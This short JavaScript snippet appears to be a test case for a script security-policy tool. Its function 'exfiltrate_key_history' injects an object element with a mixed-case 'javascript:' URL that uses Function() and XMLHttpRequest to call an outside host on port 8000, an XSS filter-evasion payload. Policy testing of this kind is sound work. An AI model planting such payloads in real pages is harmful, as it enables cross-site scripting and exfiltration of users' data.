introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var URL = 'Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss3",true);xmlhttp.send(null);\')()';
  var script = document.createElement("object");
  script.data = "JaVaScRiPt:" + URL;
  document.getElementsByTagName("body")[0].appendChild(script);
}
document.getElementById("test").onclick = exfiltrate_key_history

}
